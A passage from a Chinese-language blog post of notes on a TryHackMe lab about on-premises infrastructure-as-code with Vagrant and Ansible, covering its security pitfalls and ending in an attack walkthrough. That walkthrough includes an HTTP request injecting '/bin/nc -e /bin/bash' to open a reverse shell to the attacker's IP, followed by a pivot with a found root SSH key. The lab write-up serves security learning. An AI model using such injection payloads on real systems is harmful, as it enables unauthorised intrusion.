class="string">"docker"</span> do |d|</span><br><span class="line">      d.image = <span class="string">"mysql"</span></span><br><span class="line">      d.env = {</span><br><span class="line">        <span class="string">"MYSQL_ROOT_PASSWORD"</span> =&gt; <span class="string">"mysecretpasswd"</span></span><br><span class="line">      }</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Webserver will be used to host our website</span></span><br><span class="line">  config.vm.define <span class="string">"webserver"</span>  do |cfg|</span><br><span class="line">    <span class="comment"># Configure the local network for the server</span></span><br><span class="line">    cfg.vm.network :private_network, <span class="built_in">type</span>: <span class="string">"dhcp"</span>, docker_network__internal: true</span><br><span class="line">    cfg.vm.network :private_network, ip: <span class="string">"172.20.128.2"</span>, netmask: <span class="string">"24"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Link the shared folder with the hypervisor to allow data passthrough.</span></span><br><span class="line">    cfg.vm.synced_folder <span class="string">"./provision"</span>, <span class="string">"/tmp/provision"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Boot the Docker container and run Ansible</span></span><br><span class="line">    cfg.vm.provider <span class="string">"docker"</span> do |d|</span><br><span class="line">      d.image = <span class="string">"ansible2"</span></span><br><span class="line"></span><br><span class="line">      d.has_ssh = true</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Command will keep the container active</span></span><br><span class="line">      d.cmd = [<span class="string">"/usr/sbin/sshd"</span>, <span class="string">"-D"</span>]</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    <span class="comment">#We will connect using SSH so override the defaults here</span></span><br><span class="line">    cfg.ssh.username = <span class="string">'root'</span></span><br><span class="line">    cfg.ssh.private_key_path = <span class="string">"/home/ubuntu/iac/keys/id_rsa"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#Provision this machine using Ansible </span></span><br><span class="line">    cfg.vm.provision <span class="string">"shell"</span>, inline: <span class="string">"ansible-playbook /tmp/provision/web-playbook.yml"</span></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在此 Vagrantfile 中，我们可以看到将配置两台机器。</p>
+<p><strong>DB 服务器</strong></p>
+<p>将配置的第一台机器是 <code>dbserver</code>。通过代码行，我们可以看到该机器将被添加到本地网络并接收 IP <code>172.20.128.3</code>。我们还可以看到配置目录将作为共享挂载。最后，使用 Docker 作为提供程序，将启动 <code>mysql</code> 映像，并将 mysql 密码配置为 <code>mysecretpasswd</code>。</p>
+<p><strong>Web 服务器</strong></p>
+<p>将配置的第二台机器是 <code>webserver</code>。与 <code>dbserver</code> 机器类似，它将连接到网络并使用 Docker 作为其提供程序。但是，有一些细微的差别。首先，webserver 将公开 SSH。由于我们使用 Docker，我们必须更改一些默认的 Vagrant 配置以允许 Vagrant 通过 SSH 连接。这包括更改将用于连接的用户名和私钥。其次，我们可以通过查看以下行看到 Ansible playbook 将在容器上执行：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">cfg.vm.provision <span class="string">"shell"</span>, <span class="keyword">inline</span>: <span class="string">"ansible-playbook /vagrant/provision/web-playbook.yml"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>让我们看一下这个 Ansible 剧本会做什么。</p>
+<p>Ansible 剧本</p>
+<p>让我们首先查看“web-playbook.yml”文件：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">- hosts: localhost</span><br><span class="line">  connection: all</span><br><span class="line">  roles:</span><br><span class="line">    - webapp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这是一个简单的 Ansible 脚本，指示将在主机上配置 webapp 角色。</p>
+<p>为了更好地理解 webapp 角色将包含哪些内容，我们可以先查看 <code>~/iac/provision/roles/webapp/tasks/main.yaml</code> 文件：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">- include_tasks: <span class="string">"db-setup.yml"</span></span><br><span class="line">- include_tasks: <span class="string">"app-setup.yml"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这向我们展示了 Ansible 配置将有两个主要部分。此时，还值得查看 <code>~/iac/provision/roles/webapp/defaults/main.yml</code> 文件中的默认值：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">db_name: BucketList</span><br><span class="line">db_user: root</span><br><span class="line">db_password: mysecretpasswd</span><br><span class="line">db_host: <span class="number">172.20</span><span class="number">.128</span><span class="number">.3</span></span><br><span class="line"></span><br><span class="line">api_key: superapikey</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们稍后会回顾这些变量，但请记住它们。</p>
+<p><strong>DB 设置</strong></p>
+<p>让我们看一下 <code>db-setup.yml</code> 文件：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">- name: Create temp folder <span class="keyword">for</span> SQL scripts </span><br><span class="line">  ansible.builtin.file: </span><br><span class="line">    path: /tmp/sql state: directory</span><br><span class="line"></span><br><span class="line">- name: Time delay to allow SQL server to boot </span><br><span class="line">    shell: sleep <span class="number">10</span></span><br><span class="line"></span><br><span class="line">- name: Copy DB creation script with injected variables </span><br><span class="line">    template: </span><br><span class="line">      src: templates/createdb.sql </span><br><span class="line">      dest: /tmp/sql/createdb.sql</span><br><span class="line"></span><br><span class="line">- name: Copy DB SP script with injected variables </span><br><span class="line">    template: </span><br><span class="line">      src: templates/createsp.sql </span><br><span class="line">      dest: /tmp/sql/createsp.sql</span><br><span class="line"></span><br><span class="line">- name: Create DB </span><br><span class="line">    shell: mysql -u {{ db_user }} -p{{ db_password }} -h {{ db_host }} &lt; /tmp/sql/createdb.sql</span><br><span class="line"></span><br><span class="line">- name: Create Stored Procedures </span><br><span class="line">    shell: mysql -u {{ db_user }} -p{{ db_password }} -h {{ db_host }} &lt; /tmp/sql/createsp.sql</span><br><span class="line"></span><br><span class="line">- name: Cleanup Scripts </span><br><span class="line">    shell: rm -r /tmp/sql</span><br></pre></td></tr></tbody></table></figure>
+
+<p>从脚本中，我们可以看到将执行 7 项任务。阅读这些任务，我们可以看到将创建一个临时文件夹，SQL 脚本将被推送到该文件夹，然后针对数据库主机执行。</p>
+<p>让我们看看 Ansible 如何从之前注入这些变量。看一下“Create DB”任务的 shell 命令：</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">shell: mysql -u {{ db_user }} -p{{ db_password }} -h {{ db_host }} &lt; /tmp/sql/createdb.sql</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如您所见，将使用默认文件的值或覆盖的值（如果存在）注入 <code>db_user</code>、<code>db_password</code> 和 <code>db_host</code> 这三个变量。</p>
+<p>Ansible 允许我们更进一步。让我们看一下实际的 <code>createdb.sql</code> 文件：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> DATABASE IF <span class="keyword">EXISTS</span> {{ db_name }};</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE {{ db_name }};</span><br><span class="line">USE {{ db_name }};</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> <span class="string">'tbl_user'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> {{ db_name }}.tbl_user ( </span><br><span class="line">  <span class="string">'user_id'</span> <span class="type">BIGINT</span> AUTO_INCREMENT, </span><br><span class="line">  <span class="string">'user_name'</span> <span class="type">VARCHAR</span>(<span class="number">45</span>) <span class="keyword">NULL</span>, </span><br><span class="line">  <span class="string">'user_username'</span> <span class="type">VARCHAR</span>(<span class="number">45</span>) <span class="keyword">NULL</span>, </span><br><span class="line">  <span class="string">'user_password'</span> <span class="type">VARCHAR</span>(<span class="number">162</span>) <span class="keyword">NULL</span>, </span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (<span class="string">'user_id'</span>));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以看到，这些变量甚至被注入到将要使用的文件模板中。这使我们能够从单个集中位置控制将要使用的变量。当我们更改将用于连接数据库的用户或密码时，我们可以在一个位置进行更改，并且它将传播到角色的所有配置步骤中。</p>
+<p><strong>Web 设置</strong></p>
+<p>最后，让我们看一下 <code>app-setup.yml</code> 文件：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">- name: Copy web application files</span><br><span class="line">  shell: cp -r /vagrant/provision/roles/webapp/templates/app /</span><br><span class="line"></span><br><span class="line">- name: Copy Flask app script with injected variables</span><br><span class="line">  template:</span><br><span class="line">    src: templates/app.py</span><br><span class="line">    dest: /app/app.py</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此文件只有两个任务。第一个任务复制 Web 应用程序所需的工件，第二个任务复制 Web 应用程序文件作为模板。执行模板复制是为了确保变量（例如数据库连接字符串）也注入到脚本中。</p>
+<p>我们不会深入研究将用于配置的其余文件，但是，建议您查看这些文件以更好地了解我们到底在配置什么。</p>
+<p>运行 IaC 管道</p>
+<p>现在我们已经了解了我们的管道，是时候启动它了！让我们使用“iac”目录中的“vagrant up”启动我们的管道和配置。管道需要一段时间才能启动，但请注意正在发生的事情。</p>
+<p><strong>注意：虽然在 Ansible 配置步骤运行时，您可能会在终端上看到一些红色，但只要这些行仅表示警告而不是错误，配置就会按预期完成。</strong></p>
+<p>一旦我们的管道配置了机器，我们就可以使用 <code>docker ps</code> 命令验证它们是否正在运行：</p>
+<p>终端</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">ubuntu@tryhackme:~$ docker ps </span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS          PORTS                    NAMES </span><br><span class="line">04fc30613dd6   mysql     "docker-entrypoint.s…"   18 minutes ago   Up 18 minutes   3306/tcp, 33060/tcp      iac_dbserver_1706019401 </span><br><span class="line">5529f04a2509   ansible   "/usr/sbin/sshd -D"      18 minutes ago   Up 18 minutes   127.0.0.1:2222-&gt;22/tcp   iac_webserver_1706019400</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果正在运行，我们可以使用以下命令启动我们的 Web 应用程序：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">vagrant docker-exec -it webserver -- python3 /app/app.py</span><br></pre></td></tr></tbody></table></figure>
+
+<p>加载后，您可以使用目标机器的浏览器导航到 Web 应用程序(<a target="_blank" rel="noopener" href="http://172.20.128.2/)%EF%BC%9A">http://172.20.128.2/)：</a></p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39e697edab7cba60952ccdb28ece98c9.png" alt="img"></p>
+<p>恭喜！您已经执行了第一个 IaC 管道！</p>
+<h1 id="Security-Concerns-in-On-Prem-IaC"><a href="#Security-Concerns-in-On-Prem-IaC" class="headerlink" title="Security Concerns in On-Prem IaC"></a>Security Concerns in On-Prem IaC</h1><p>使用 IaC 时，无论部署是在本地还是基于云，都需要考虑一些安全问题。如果您正在寻找安全最佳实践，<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Infrastructure_as_Code_Security_Cheat_Sheet.html">来自 OWASP 的这些</a> 等备忘单是一个不错的起点。甚至 <a target="_blank" rel="noopener" href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204C.pdf">NIST</a> 等框架也提供了有关如何保护 IaC 的信息。</p>
+<p>但是，在这个房间里，我们将更多地关注 IaC 的实际安全性以及现实世界中常见的错误。这不是需要考虑的事项的完整列表，但它是一个很好的开始，无论是保护您的 IaC 管道免受现实世界的攻击，还是在红队交战中攻击 IaC 管道时要注意什么。总共有四个主要元素需要考虑。</p>
+<p>依赖项</p>
+<p>IaC 管道中需要考虑安全性的第一个元素是依赖项。与软件管道类似，我们的 IaC 管道将具有依赖项。在 IaC 管道中，最大的依赖项是用于构建基础架构的基础映像。如果这些依赖项存在任何安全问题，这些问题将通过管道传播。</p>
+<p>一个常见的例子是映像的操作系统版本中的漏洞。如果映像本身未更新，则部署的主机将存在此漏洞。因此，确保对 IaC 管道中使用的资源进行充分的依赖管理非常重要。每当您使用第三方软件或系统时，都可能带来依赖风险。有关依赖项管理和潜在漏洞的更多信息，请查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/dependencymanagement">依赖项管理</a> 房间。</p>
+<p>默认值</p>
+<p>IaC 管道中常见的安全漏洞是未更改默认值。当主机和服务最初通过 IaC 管道配置时，使用默认凭据或连接字符串配置这些系统是非常常见的。归根结底，这是有意为之，因为管道中的工具使用这些默认凭据来配置主机。因此，安全配置错误不是默认凭据，而是没有在 IaC 部署的最后一步删除或更改它们。</p>
+<p>默认凭据的一个示例是 Vagrant 用于配置 Windows 主机的凭据。Vagrant 提供的 Windows 映像通常具有内置的默认帐户“vagrant”，其密码为“vagrant”。这是为了让虚拟机管理程序上运行的 Vagrant 脚本连接到主机进行文件传输和脚本执行。如果在部署结束时未删除此默认用户，威胁行为者可以使用它来连接并完全控制通过 IaC 管道部署的所有主机。</p>
+<p>默认值的另一个问题是部署在主机上的服务。例如，假设我们的 IaC 管道用于部署 CI/CD 管道，因此将在其中一个主机上安装 Jenkins 角色。通常使用 Jenkins 的默认凭据安装此角色，即“jenkins:jenkins”。在这种情况下，我们无法在 IaC 部署的最后阶段真正更改这些凭据，但希望使用 CI/CD 基础架构的软件工程师能够更改凭据。在某些情况下，不会执行此操作，这会导致部署中的基础架构不安全。在其他情况下，即使软件要求用户在第一次登录事件时更改密码，由于从未使用过该软件，默认凭据仍然存在，从而允许威胁行为者破坏服务及其潜在的底层基础架构。</p>
+<p>因此，在构建 IaC 管道时，重要的是要注意使用默认值的情况以及如果不更改默认值可能会带来风险的情况。然后，应将这些默认值的更改作为 IaC 管道中的最后步骤嵌入，或者在需要时在部署完成后手动执行。</p>
+<p>强化不足</p>
+<p>IaC 管道中经常出错的第三个元素是强化不足。IaC 的主要目标是快速部署基础设施。这通常意味着正在部署的基础设施尚未完全强化。强化不是自动发生的事情；它必须经过规划。因此，重要的是确保强化步骤嵌入 IaC 管道中或在部署后手动执行。</p>
+<p>强化不足的一个常见例子是 IaC 管道用于部署的服务。例如，当 Vagrant 进行 Windows 主机的配置时，它通过 WinRM 连接进行此操作。碰巧的是，WinRM 是威胁行为者通常用于横向移动的服务。因此，重要的是，如果不再需要该服务,红色表示部署后正常运行，应将其禁用。在规划 IaC 管道时，不仅要包括一般的强化步骤，还要包括关闭管道本身使用的服务的那些步骤。</p>
+<p>远程代码执行作为一项功能</p>
+<p>最后一个要考虑的因素是要记住，最终，IaC 管道只不过是远程代码执行作为一项功能。本质上，管道正在有效地执行允许创建新基础设施并将其集成到现有网络中的代码。虽然这在合适的人手中非常强大，但也可能极其有害。</p>
+<p>考虑到这一点，重要的是将安全性应用于 IaC 管道以防止未经授权的访问。这可以通过两项主要的安全措施来实现，即秘密管理和遵循最小特权原则。</p>
+<p>通过秘密管理，我们可以确保敏感信息（例如最终凭证或密钥）得到安全存储，并且不能简单地从 IaC 源代码中读取以破坏部署。</p>
+<p>遵循最小特权原则可确保仅向需要 IaC 管道的用户和服务提供访问权限。这包括实施 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/cicdandbuildsecurity">CI/CD 和构建安全</a> 房间中教授的任何管道中都应有的相同安全控制。如果威胁行为者能够破坏管道，他们通常也能够破坏已部署的基础设施。</p>
+<p>这些是保护您的 IaC 管道免受现实世界威胁所需的一些关键安全考虑因素。现在您知道要寻找什么，让我们利用这些知识来攻击易受攻击的 IaC 管道！</p>
+<h1 id="Attacking-On-Prem-IaC"><a href="#Attacking-On-Prem-IaC" class="headerlink" title="Attacking On-Prem IaC"></a>Attacking On-Prem IaC</h1><p>ssh上到所给的机器上,查看Vagrantfile,能够看到开了一台数据库和一个web实例</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Vagrant.configure("2") do |config|</span><br><span class="line">  # DB server will be the backend for our website</span><br><span class="line">  config.vm.define "dbserver"  do |cfg|</span><br><span class="line">    # Configure the local network for the server</span><br><span class="line">    cfg.vm.network :private_network, type: "dhcp", docker_network__internal: true</span><br><span class="line">    cfg.vm.network :private_network, ip: "172.20.128.3", netmask: "24"</span><br><span class="line"></span><br><span class="line">    # Boot the Docker container and run Ansible</span><br><span class="line">    cfg.vm.provider "docker" do |d|</span><br><span class="line">      d.image = "mysql_vuln"</span><br><span class="line">      d.env = {</span><br><span class="line">        "MYSQL_ROOT_PASSWORD" =&gt; "mysecretpasswd"</span><br><span class="line">      }</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  # Webserver will be used to host our website</span><br><span class="line">  config.vm.define "webserver"  do |cfg|</span><br><span class="line">    # Configure the local network for the server</span><br><span class="line">    cfg.vm.network :private_network, type: "dhcp", docker_network__internal: true</span><br><span class="line">    cfg.vm.network :private_network, ip: "172.20.128.2", netmask: "24"</span><br><span class="line"></span><br><span class="line">    # Link the shared folder with the hypervisor to allow data passthrough. Will remove later to harden</span><br><span class="line">    cfg.vm.synced_folder "./provision", "/tmp/provision"</span><br><span class="line">    cfg.vm.synced_folder "/home/ubuntu/", "/tmp/datacopy"</span><br><span class="line"></span><br><span class="line">    # Boot the Docker container and run Ansible</span><br><span class="line">    cfg.vm.provider "docker" do |d|</span><br><span class="line">      d.image = "ansible"</span><br><span class="line"></span><br><span class="line">      #d.cmd = ["ansible-playbook", "/tmp/provision/web-playbook.yml"]</span><br><span class="line">      d.has_ssh = true</span><br><span class="line"></span><br><span class="line">      # Command will keep the container active</span><br><span class="line">      d.cmd = ["/usr/sbin/sshd", "-D"]</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    #We will connect using SSH so override the defaults here</span><br><span class="line">    cfg.ssh.username = 'root'</span><br><span class="line">    cfg.ssh.private_key_path = "/home/ubuntu/iac/keys/id_rsa"</span><br><span class="line"></span><br><span class="line">    #Provision this machine using Ansible </span><br><span class="line">    cfg.vm.provision "shell", inline: "ansible-playbook /tmp/provision/web-playbook.yml"</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure>
+
+<p>做一个代理隧道</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ sshuttle -r entry@10.10.17.148 172.20.128.0/24 -x 10.10.17.148</span><br><span class="line">entry@10.10.17.148's password: </span><br><span class="line">c : Connected to server.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>浏览器访问172.20.128.2,在上面的sign in 功能下有个”Test DB”,抓包发现存在命令执行，进行反弹shell，拿到web server的shell</p>
+<figure class="highlight http"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/testDB</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">172.20.128.2</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (X11; Linux x86_64; rv:<span class="number">128</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">128</span>.<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/png,image/svg+xml,*/*;q=<span class="number">0</span>.<span class="number">8</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Language: en-US,en;q=<span class="number">0</span>.<span class="number">5</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">46</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Origin</span>: http://<span class="number">172.20.128.2</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Connection</span>: keep-alive</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Referer</span>: http://<span class="number">172.20.128.2</span>/signin</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Priority</span>: u=<span class="number">0</span>, i</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">_command</span>=/bin/nc -e /bin/bash <span class="number">10.11.77.28</span> <span class="number">1234</span></span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这个实例的根目录有一个vagrant,在keys目录下找到一个私钥，尝试了一下是root的ssh私钥</p>
+<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ ssh -i key root@172.20.128.2</span><br><span class="line">The authenticity of host '172.20.128.2 (172.20.128.2)' can't be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:boDec2JnufjzpTja2GnM5dfr0Lek2pq2NufUjX7UHEs.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added '172.20.128.2' (ED25519) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-1029-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the 'unminimize' command.</span><br><span class="line">Last login: Tue Jan 23 13:10:15 2024 from 172.20.128.3</span><br><span class="line">root@e485755d7773:~# ls</span><br><span class="line">flag2-of-4.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在/tmp/datacopy中找到第三个flag</p>
+<p>发现还有一个.ssh目录，并且所给的entry还有一个ubuntu用户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@e485755d7773:/tmp/datacopy# ls -a</span><br><span class="line">.              .icons                     .viminfo          Videos</span><br><span class="line">..             .local                     .vimrc            dimage</span><br><span class="line">.Xauthority    .mozilla                   .vnc              flag3-of-4.txt</span><br><span class="line">.ansible       .mysql_history             .wget-hsts        flask-app-terminator</span><br><span class="line">.bash_history  .profile                   .xsession-errors  flask-app-terminator.zip</span><br><span class="line">.bash_logout   .selected_editor           Desktop           flask-webapp</span><br><span class="line">.bashrc        .ssh                       Documents         flask-webapp.zip</span><br><span class="line">.cache         .sudo_as_admin_successful  Downloads         iac</span><br><span class="line">.config        .themes                    Music             script.sh</span><br><span class="line">.dbus          .vagrant.d                 Pictures          script_start.sh</span><br><span class="line">.docker        .vim_mru_files             Public            test</span><br><span class="line">.gnupg         .vim_runtime               Templates</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在这个房间里，我们了解了本地 IaC。让我们回顾一下：</p>
+<ul>
+<li>如今仍有理由在本地而不是云端执行 IaC</li>
+<li>Vagrant 和 Ansible 是两套可用于 IaC 管道的软件</li>
+<li>有了 IaC 管道，我们面临更大的安全隐患，因为 IaC 管道本身就是远程代码执行，威胁行为者可以利用它来创建新的机器</li>
+<li>虽然 IaC 管道为基础设施的部署提供了自动化，但我们仍然负责手动或通过使用自动化来强化已部署的基础设施</li>
+</ul>
+<p>现在您已经了解了内部部署 IaC，现在是时候了解一下基于云的 IaC 了！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn/2025/03/24/On-PremisesIaCTHM/">https://blog.mikannse.cn/2025/03/24/On-PremisesIaCTHM/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.mikannse.cn" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/DevSecOps/">DevSecOps</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/25/Cloud-basedIaCTHM/" title="Cloud-basedIaCTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Cloud-basedIaCTHM</div></div></a></div><div class="next-post pull-right"><a href="/2025/03/24/%E5%85%B3%E4%BA%8E%E6%96%B0%E7%89%88kali%E4%BD%BF%E7%94%A8jdk1.8jar%E5%8C%85%E6%97%B6%E7%9A%84%E5%88%86%E9%85%8D%E9%97%AE%E9%A2%98/" title="关于新版kali使用jdk1.8jar包时的分配问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">关于新版kali使用jdk1.8jar包时的分配问题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/03/25/Cloud-basedIaCTHM/" title="Cloud-basedIaCTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-25</div><div class="title">Cloud-basedIaCTHM</div></div></a></div><div><a href="/2025/03/03/THMContainerHardening/" title="THMContainerHardening"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-03</div><div class="title">THMContainerHardening</div></div></a></div><div><a href="/2025/02/28/THMDependencyManagement/" title="THMDependencyManagement"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-28</div><div class="title">THMDependencyManagement</div></div></a></div><div><a href="/2025/03/02/THMSAST/" title="THMSAST"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">THMSAST</div></div></a></div><div><a href="/2024/07/19/CSS%E9%9A%8F%E6%89%8B%E8%AE%B0/" title="CSS随手记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-19</div><div class="title">CSS随手记</div></div></a></div><div><a href="/2024/06/15/AdvancedSQLInjectionTHM/" title="AdvancedSQLInjectionTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-15</div><div class="title">AdvancedSQLInjectionTHM</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">319</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 